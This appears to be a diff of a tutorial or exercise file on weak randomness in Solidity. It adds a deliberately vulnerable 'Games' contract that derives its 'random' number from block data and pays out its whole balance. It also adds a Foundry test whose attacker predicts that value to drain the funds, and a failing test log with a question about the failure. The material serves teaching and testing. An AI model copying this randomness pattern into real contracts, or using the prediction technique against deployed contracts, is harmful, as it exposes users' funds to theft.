@@ -86,19 +86,87 @@ Problem
 pragma solidity ^0.8.28;
 
 contract Games {
-// constructor() payable: The constructor is executed only once when the contract is deployed
-// payable allows the contract to receive Ether during deployment
-    constructor () payable {}
+    constructor() payable {}
 
-    function play(uint gues) external {
+    function play(uint256 gues) public {
+        // Calculate a pseudo-random number
         uint256 random = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
-// Checking the Guess
-        if (gues == random) {
-            (bool success,) = msg.sender.call{value: address(this).balance}("");
-            require(success, "Transfer failed.");
+
+        // If the guess is correct, transfer all the contract's balance to the sender
+        if (random == gues) {
+            payable(msg.sender).transfer(address(this).balance);
         }
     }
 }
+
 ```
+- Test With Foundry FrameWork
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.28;
+
+import {Test, console} from "forge-std/Test.sol";
+import {Games} from "../src/Games.sol";
+
+contract CounterTest is Test {
+    Games public games;
+
+    address public attacker = address(0x2);
+
+    function setUp() public {
+       // Deploy the Games contract with an initial balance 10 ether
+        games = new Games{value: 10 ether}();
+         console.log("games address: %s", address(games));
+    }
+    function testPlay() public {
+        vm.startPrank(attacker);
+       // Ensure the attacker has some Ether to call the play function
+        vm.deal(attacker,1 ether);
+        // Predict the random value
+        uint256 guess = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
+        // Call the play function with the predicted value
+        games.play(guess);
+        // Check if the attacker successfully drained the funds
+        assertEq( attacker.balance, 10 ether);
+    }   
+}
+```
+
+
+- run command ``` forge compile ``` or ``` forge build  ``` to compile contract
+- run command ``` forge create <contract path> --rpc-url <rpc url > -- private-key <private key > --value 10ether --broadcast``` to deploy
+- run command ``` forge test -vvv ```  test fail WHY?
+  
+```solidity
+Ran 1 test for test/Games.t.sol:CounterTest
+[FAIL: assertion failed: 11000000000000000000 != 10000000000000000000] testPlay() (gas: 18818)
+Logs:
+  games address: 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+
+Traces:
+  [18818] CounterTest::testPlay()
+    ├─ [0] VM::startPrank(SHA-256: [0x0000000000000000000000000000000000000002])
+    │   └─ ← [Return] 
+    ├─ [0] VM::deal(SHA-256: [0x0000000000000000000000000000000000000002], 1000000000000000000 [1e18])
+    │   └─ ← [Return] 
+    ├─ [7368] Games::play(96758112507123037457144765246511711555223209187725868989644329763805255684767 [9.675e76])
+    │   ├─ [60] PRECOMPILES::sha256{value: 10000000000000000000}(0x)
+    │   │   └─ ← [Return] 0xe3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+    │   └─ ← [Stop] 
+    ├─ [0] VM::assertEq(11000000000000000000 [1.1e19], 10000000000000000000 [1e19]) [staticcall]
+    │   └─ ← [Revert] assertion failed: 11000000000000000000 != 10000000000000000000
+    └─ ← [Revert] assertion failed: 11000000000000000000 != 10000000000000000000
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 44.34ms (242.05µs CPU time)
+
+Ran 1 test suite in 80.22ms (44.34ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Games.t.sol:CounterTest
+[FAIL: assertion failed: 11000000000000000000 != 10000000000000000000] testPlay() (gas: 18818)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+```
+
 
 
